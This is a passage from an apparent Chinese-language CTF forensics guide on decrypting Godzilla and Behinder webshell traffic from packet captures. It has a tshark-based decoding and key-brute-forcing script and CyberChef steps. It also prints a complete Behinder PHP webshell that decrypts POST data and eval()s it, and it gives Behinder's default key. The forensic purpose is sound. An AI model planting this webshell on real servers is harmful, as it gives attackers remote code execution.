</span></span><span class=line><span class=cl>        <span class=n>c</span> <span class=o>=</span> <span class=n>key</span><span class=p>[(</span><span class=n>i</span> <span class=o>+</span> <span class=mi>1</span><span class=p>)</span> <span class=o>&amp;</span> <span class=mi>15</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>result</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>data</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>^</span> <span class=n>c</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=nb>bytes</span><span class=p>(</span><span class=n>result</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>gunzip_bytes</span><span class=p>(</span><span class=n>compressed_data</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>)</span> <span class=o>-&gt;</span> <span class=nb>bytes</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=n>gzip</span><span class=o>.</span><span class=n>GzipFile</span><span class=p>(</span><span class=n>fileobj</span><span class=o>=</span><span class=n>io</span><span class=o>.</span><span class=n>BytesIO</span><span class=p>(</span><span class=n>compressed_data</span><span class=p>))</span> <span class=k>as</span> <span class=n>f</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=n>f</span><span class=o>.</span><span class=n>read</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>decrypt_traffic</span><span class=p>(</span><span class=n>filename</span><span class=p>,</span><span class=n>key</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>http_data</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>    <span class=n>command</span> <span class=o>=</span> <span class=p>[</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;tshark&#34;</span><span class=p>,</span>  <span class=c1># tshark的路径，如果在环境变量里这里就不用改</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;-r&#39;</span><span class=p>,</span> <span class=n>filename</span><span class=p>,</span>  <span class=c1># 读取指定的 pcapng 文件</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;-Y&#39;</span><span class=p>,</span> <span class=s1>&#39;http&#39;</span><span class=p>,</span>  <span class=c1># 过滤出 HTTP 数据包</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;-T&#39;</span><span class=p>,</span> <span class=s1>&#39;json&#39;</span><span class=p>,</span>  <span class=c1># 输出为 JSON 格式</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;-e&#39;</span><span class=p>,</span> <span class=s1>&#39;http.file_data&#39;</span><span class=p>,</span>  <span class=c1># 请求中的文件数据（POST 请求的内容）</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;-e&#39;</span><span class=p>,</span> <span class=s1>&#39;http.response.phrase&#39;</span><span class=p>,</span>  <span class=c1># 响应短语</span>
</span></span><span class=line><span class=cl>        <span class=s1>&#39;-e&#39;</span><span class=p>,</span> <span class=s1>&#39;http.content_type&#39;</span>  <span class=c1># 响应内容类型</span>
</span></span><span class=line><span class=cl>    <span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>result</span> <span class=o>=</span> <span class=n>subprocess</span><span class=o>.</span><span class=n>run</span><span class=p>(</span>
</span></span><span class=line><span class=cl>        <span class=n>command</span><span class=p>,</span> <span class=n>check</span><span class=o>=</span><span class=kc>True</span><span class=p>,</span> <span class=n>stdout</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>,</span> <span class=n>stderr</span><span class=o>=</span><span class=n>subprocess</span><span class=o>.</span><span class=n>PIPE</span><span class=p>,</span> <span class=n>text</span><span class=o>=</span><span class=kc>True</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>json_output</span> <span class=o>=</span> <span class=n>json</span><span class=o>.</span><span class=n>loads</span><span class=p>(</span><span class=n>result</span><span class=o>.</span><span class=n>stdout</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=c1># print(json.dumps(json_output, indent=4))  # 这个输出是用来调试的，可以移除</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 遍历 JSON 数据并提取字段</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>packet</span> <span class=ow>in</span> <span class=n>json_output</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>layers</span> <span class=o>=</span> <span class=n>packet</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;_source&#39;</span><span class=p>,</span> <span class=p>{})</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;layers&#39;</span><span class=p>,</span> <span class=p>{})</span>
</span></span><span class=line><span class=cl>        <span class=n>request_method</span> <span class=o>=</span> <span class=n>layers</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;http.request.method&#39;</span><span class=p>,</span> <span class=p>[</span><span class=s1>&#39;None&#39;</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>response_code</span> <span class=o>=</span> <span class=n>layers</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;http.response.code&#39;</span><span class=p>,</span> <span class=p>[</span><span class=s1>&#39;None&#39;</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=n>file_data</span> <span class=o>=</span> <span class=n>layers</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=s1>&#39;http.file_data&#39;</span><span class=p>,</span> <span class=p>[</span><span class=s1>&#39;None&#39;</span><span class=p>])[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>http_data</span><span class=o>.</span><span class=n>append</span><span class=p>(</span><span class=n>url_decode</span><span class=p>(</span><span class=nb>bytes</span><span class=o>.</span><span class=n>fromhex</span><span class=p>(</span><span class=n>file_data</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>        <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>pass</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>item</span> <span class=ow>in</span> <span class=n>http_data</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># print(item)</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;Antsword=&#34;</span> <span class=ow>in</span> <span class=n>item</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>enc</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;Antsword=(.*)&#34;</span><span class=p>,</span><span class=n>item</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>                <span class=c1># print(enc)</span>
</span></span><span class=line><span class=cl>                <span class=n>dec</span> <span class=o>=</span> <span class=n>xor_decode</span><span class=p>(</span><span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>enc</span><span class=p>),</span><span class=n>key</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                <span class=n>dec</span> <span class=o>=</span> <span class=n>gunzip_bytes</span><span class=p>(</span><span class=n>dec</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>,</span><span class=n>errors</span><span class=o>=</span><span class=s1>&#39;ignore&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] 请求: </span><span class=si>{</span><span class=n>dec</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>pass</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=s2>&#34;e71f50e9773b23f9&#34;</span> <span class=ow>in</span> <span class=n>item</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>enc</span> <span class=o>=</span> <span class=n>re</span><span class=o>.</span><span class=n>findall</span><span class=p>(</span><span class=sa>r</span><span class=s2>&#34;e71f50e9773b23f9(.*)792dea3a7ae385ca&#34;</span><span class=p>,</span><span class=n>item</span><span class=p>)[</span><span class=mi>0</span><span class=p>]</span>
</span></span><span class=line><span class=cl>                <span class=n>dec</span> <span class=o>=</span> <span class=n>xor_decode</span><span class=p>(</span><span class=n>base64</span><span class=o>.</span><span class=n>b64decode</span><span class=p>(</span><span class=n>enc</span><span class=p>),</span><span class=n>key</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>                <span class=n>dec</span> <span class=o>=</span> <span class=n>gunzip_bytes</span><span class=p>(</span><span class=n>dec</span><span class=p>)</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>,</span><span class=n>errors</span><span class=o>=</span><span class=s1>&#39;ignore&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] 响应: </span><span class=si>{</span><span class=n>dec</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>except</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=k>pass</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>md5_encode</span><span class=p>(</span><span class=n>text</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>hashlib</span><span class=o>.</span><span class=n>md5</span><span class=p>(</span><span class=n>text</span><span class=o>.</span><span class=n>encode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span><span class=o>.</span><span class=n>hexdigest</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>crack_key</span><span class=p>(</span><span class=n>key_list</span><span class=p>,</span><span class=n>target_hash</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>pwd</span> <span class=o>=</span> <span class=s2>&#34;Antsword&#34;</span> <span class=c1># 哥斯拉的连接密码</span>
</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>key</span> <span class=ow>in</span> <span class=n>key_list</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>tmp</span> <span class=o>=</span> <span class=n>md5_encode</span><span class=p>(</span><span class=n>key</span><span class=p>)</span> <span class=c1># 明文密钥的MD5</span>
</span></span><span class=line><span class=cl>        <span class=n>tmp_hash</span> <span class=o>=</span> <span class=n>md5_encode</span><span class=p>(</span><span class=n>pwd</span><span class=o>+</span><span class=n>tmp</span><span class=p>[:</span><span class=mi>16</span><span class=p>])</span> <span class=c1># 响应中返回的hash</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>tmp_hash</span> <span class=o>==</span> <span class=n>target_hash</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] 密钥爆破成功: </span><span class=si>{</span><span class=n>key</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[+] 用于解密哥斯拉流量的密钥为 </span><span class=si>{</span><span class=n>tmp</span><span class=p>[:</span><span class=mi>16</span><span class=p>]</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>key</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s1>&#39;__main__&#39;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=c1># 响应中返回的hash</span>
</span></span><span class=line><span class=cl>    <span class=c1># target_hash = &#34;e71f50e9773b23f9792dea3a7ae385ca&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># with open(&#34;dic.txt&#34;,&#39;r&#39;) as f:</span>
</span></span><span class=line><span class=cl>        <span class=c1># key_list = f.read().split()</span>
</span></span><span class=line><span class=cl>    <span class=c1># crack_key(key_list, target_hash)</span>
</span></span><span class=line><span class=cl>    <span class=c1># [+] 密钥爆破成功: Antsw0rd</span>
</span></span><span class=line><span class=cl>    <span class=c1># [+] 用于解密哥斯拉流量的密钥为 a18551e65c48f51e</span>
</span></span><span class=line><span class=cl>    <span class=n>decrypt_traffic</span><span class=p>(</span><span class=s1>&#39;Crack_me.pcap&#39;</span><span class=p>,</span><span class=s1>&#39;a18551e65c48f51e&#39;</span><span class=p>)</span></span></span></code></pre></td></tr></table></div></div><h4 class=heading-element id=php_xor_raw><span>php_xor_raw</span>
<a href=#php_xor_raw class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><p>传输的数据类似于下图这种</p><p><img loading=lazy src=/posts/5422d65/imgs/image-20250226141615204.png alt=/posts/5422d65/imgs/image-20250226141615204.png height=864 width=1306></p><p>因此我们直接对照着加密逻辑，CyberChef解密请求和响应即可（当然这里也可以写个脚本批量解）</p><p><img loading=lazy src=/posts/5422d65/imgs/image-20250226141953586.png alt=/posts/5422d65/imgs/image-20250226141953586.png height=639 width=1919></p><p><img loading=lazy src=/posts/5422d65/imgs/image-20250226142116762.png alt=/posts/5422d65/imgs/image-20250226142116762.png height=988 width=1919></p><h4 class=heading-element id=php_xor_base64><span>php_xor_base64</span>
<a href=#php_xor_base64 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><p><img loading=lazy src=/posts/5422d65/imgs/image-20250226142501601.png alt=/posts/5422d65/imgs/image-20250226142501601.png height=745 width=808></p><p>加密逻辑和上面的一样，就是多了一个URL解码和Base64解码的过程</p><p><img loading=lazy src=/posts/5422d65/imgs/image-20250226142239379.png alt=/posts/5422d65/imgs/image-20250226142239379.png height=642 width=1917></p><p>然后响应的数据头尾会输出<code>md5(pass.key)</code>的前十六位和后十六位，解密的时候删去即可</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>echo</span> <span class=nx>substr</span><span class=p>(</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$pass</span><span class=o>.</span><span class=nv>$key</span><span class=p>),</span><span class=mi>0</span><span class=p>,</span><span class=mi>16</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nx>encode</span><span class=p>(</span><span class=o>@</span><span class=nx>run</span><span class=p>(</span><span class=nv>$data</span><span class=p>),</span><span class=nv>$key</span><span class=p>));</span>
</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=nx>substr</span><span class=p>(</span><span class=nx>md5</span><span class=p>(</span><span class=nv>$pass</span><span class=o>.</span><span class=nv>$key</span><span class=p>),</span><span class=mi>16</span><span class=p>);</span></span></span></code></pre></td></tr></table></div></div><p><img loading=lazy src=/posts/5422d65/imgs/image-20250226142441765.png alt=/posts/5422d65/imgs/image-20250226142441765.png height=828 width=1919></p><h4 class=heading-element id=php_eval_xor_base64><span>php_eval_xor_base64</span>
<a href=#php_eval_xor_base64 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><p><img loading=lazy src=/posts/5422d65/imgs/image-20250226142732540.png alt=/posts/5422d65/imgs/image-20250226142732540.png height=867 width=1190></p><p>这种情况下前面的数据<code>URL解码+reverse+Base64解码</code>后可以得到加密的key</p><p>然后执行的命令在第二个参数中，就是上图中的<code>babyshell</code></p><p>剩下的步骤就和之前一样了</p><p><img loading=lazy src=/posts/5422d65/imgs/image-20250226143409529.png alt=/posts/5422d65/imgs/image-20250226143409529.png height=645 width=1917></p><p><img loading=lazy src=/posts/5422d65/imgs/image-20250226143429376.png alt=/posts/5422d65/imgs/image-20250226143429376.png height=607 width=1917></p><h3 class=heading-element id=冰蝎流量分析><span>冰蝎流量分析</span>
<a href=#%e5%86%b0%e8%9d%8e%e6%b5%81%e9%87%8f%e5%88%86%e6%9e%90 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h3><blockquote><p>冰蝎的默认密钥为：e45e329feb5d925b（md5(rebeyond)的前16位）</p><p>！！当找不到密钥或者密钥未知的时候可以尝试直接用默认密钥解密试一下！！</p></blockquote><p>或者也可以尝试用<code>PuzzleSolver</code>爆破一下密钥</p><p><img loading=lazy src=/posts/5422d65/imgs/image-20250424172707884.png alt=/posts/5422d65/imgs/image-20250424172707884.png height=1114 width=1504></p><p>冰蝎流量的加密方式主要包括异或和AES，异或加密的话是和哥斯拉一样的</p><p>具体的加密代码如下所示：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=nx>session_start</span><span class=p>();</span>
</span></span><span class=line><span class=cl>	<span class=c1>// $key=&#34;e45e329feb5d925b&#34;; // 默认密钥
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nv>$key</span><span class=o>=</span><span class=s2>&#34;5b4582c9d56b5b33&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nv>$_SESSION</span><span class=p>[</span><span class=s1>&#39;k&#39;</span><span class=p>]</span><span class=o>=</span><span class=nv>$key</span><span class=p>;</span>
</span></span><span class=line><span class=cl>	<span class=nv>$post</span><span class=o>=</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s2>&#34;php://input&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span><span class=p>(</span><span class=o>!</span><span class=nx>extension_loaded</span><span class=p>(</span><span class=s1>&#39;openssl&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nv>$t</span><span class=o>=</span><span class=s2>&#34;base64_&#34;</span><span class=o>.</span><span class=s2>&#34;decode&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>		<span class=nv>$post</span><span class=o>=</span><span class=nv>$t</span><span class=p>(</span><span class=nv>$post</span><span class=o>.</span><span class=s2>&#34;&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>		
</span></span><span class=line><span class=cl>		<span class=k>for</span><span class=p>(</span><span class=nv>$i</span><span class=o>=</span><span class=mi>0</span><span class=p>;</span><span class=nv>$i</span><span class=o>&lt;</span><span class=nx>strlen</span><span class=p>(</span><span class=nv>$post</span><span class=p>);</span><span class=nv>$i</span><span class=o>++</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    			 <span class=nv>$post</span><span class=p>[</span><span class=nv>$i</span><span class=p>]</span> <span class=o>=</span> <span class=nv>$post</span><span class=p>[</span><span class=nv>$i</span><span class=p>]</span><span class=o>^</span><span class=nv>$key</span><span class=p>[</span><span class=nv>$i</span><span class=o>+</span><span class=mi>1</span><span class=o>&amp;</span><span class=mi>15</span><span class=p>];</span> 
</span></span><span class=line><span class=cl>    			<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=k>else</span>
</span></span><span class=line><span class=cl>	<span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nv>$post</span><span class=o>=</span><span class=nx>openssl_decrypt</span><span class=p>(</span><span class=nv>$post</span><span class=p>,</span> <span class=s2>&#34;AES128&#34;</span><span class=p>,</span> <span class=nv>$key</span><span class=p>);</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nv>$arr</span><span class=o>=</span><span class=nx>explode</span><span class=p>(</span><span class=s1>&#39;|&#39;</span><span class=p>,</span><span class=nv>$post</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nv>$func</span><span class=o>=</span><span class=nv>$arr</span><span class=p>[</span><span class=mi>0</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=nv>$params</span><span class=o>=</span><span class=nv>$arr</span><span class=p>[</span><span class=mi>1</span><span class=p>];</span>
</span></span><span class=line><span class=cl>	<span class=k>class</span> <span class=nc>C</span><span class=p>{</span><span class=k>public</span> <span class=k>function</span> <span class=fm>__invoke</span><span class=p>(</span><span class=nv>$p</span><span class=p>)</span> <span class=p>{</span><span class=k>eval</span><span class=p>(</span><span class=nv>$p</span><span class=o>.</span><span class=s2>&#34;&#34;</span><span class=p>);}}</span>
</span></span><span class=line><span class=cl>    <span class=o>@</span><span class=nx>call_user_func</span><span class=p>(</span><span class=k>new</span> <span class=nx>C</span><span class=p>(),</span><span class=nv>$params</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>
</span></span></span></code></pre></td></tr></table></div></div><blockquote><p>大体功能是：POST接收加密数据，随后先进行Base64解码，再判断是否启用OpenSSL扩展，如果启用则使用AES解密，如果没有则使用密钥循环异或解密。Webshell在上传后，会先生成一段代码用于处理执行结果并加密返回给客户端，确保响应流量中的数据也是加密的，随后开始执行攻击者的命令，如果是PHP Webshell，在冰蝎客户端中点开该shell的时候会自动执行一次phpinfo，以上过程在流量中均有体现。</p></blockquote><h4 class=heading-element id=xor_base64><span>XOR_base64</span>
<a href=#xor_base64 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><p>异或的情况和哥斯拉的有点像，把密钥的第一位放到最后一位然后解密即可</p><p><img loading=lazy src=/posts/5422d65/imgs/image-20250419164124175.png alt=/posts/5422d65/imgs/image-20250419164124175.png height=1528 width=2560></p><h4 class=heading-element id=aes_base64><span>AES_base64</span>
<a href=#aes_base64 class=heading-mark><svg class="octicon octicon-link" viewBox="0 0 16 16" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5.0 114.95 4.95l-2.5 2.5a3.5 3.5.0 01-4.95.0.751.751.0 01.018-1.042.751.751.0 011.042-.018 1.998 1.998.0 002.83.0l2.5-2.5a2.002 2.002.0 00-2.83-2.83l-1.25 1.25a.751.751.0 01-1.042-.018.751.751.0 01-.018-1.042zm-4.69 9.64a1.998 1.998.0 002.83.0l1.25-1.25a.751.751.0 011.042.018.751.751.0 01.018 1.042l-1.25 1.25a3.5 3.5.0 11-4.95-4.95l2.5-2.5a3.5 3.5.0 014.95.0.751.751.0 01-.018 1.042.751.751.0 01-1.042.018 1.998 1.998.0 00-2.83.0l-2.5 2.5a1.998 1.998.0 000 2.83z"/></svg></a></h4><p>当加密器用的是AES加密的时候就需要注意了</p><p>可能会有两种情况，一种是AES-ECB（没有IV），一种是AES-CBC（有IV）</p><p>如果是 AES-ECB，那直接用填入密钥解密即可，这里我们详细讨论一下 AES-CBC 的情况</p><blockquote><p>这里仅讨论默认PHP Webshell的情况，不同语言或不同Shell情况不同，需分情况对待</p></blockquote><p>冰蝎4.0的默认IV是：<code>\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00</code></p><p>首先，需要分析那段PHP Webshell中的一句：<code>$post=openssl_decrypt($post, "AES128", $key);</code></p><p>该Shell通过OpenSSL扩展实现AES加解密，而OpenSSL中的AES128通常默认对应AES-128-CBC，而上文那句话里并没有传入IV参数，所以OpenSSL会把所需的IV处理为默认值，也就是全0（16个\x00）</p><p>如果在WebShell中传了自定义的IV参数，那么解密时需要将该IV填入，比如：<code>0123456789abcdef</code></p><p>照常理来说使用这样默认为16个<code>\x00</code>的IV即可正常解密。但传入16个1也可以正常解出<code>base64_decode()</code>括号内的内容，如下图所示：</p><p><img loading=lazy src=/posts/5422d65/imgs/f4413f003bad201ef52b84974e4a5bdb.png alt=/posts/5422d65/imgs/f4413f003bad201ef52b84974e4a5bdb.png height=920 width=2063></p><p>这要说到AES-CBC的原理：</p><p><img loading=lazy src=/posts/5422d65/imgs/040733479f1ea54a0871282953df365a.png alt=/posts/5422d65/imgs/040733479f1ea54a0871282953df365a.png height=744 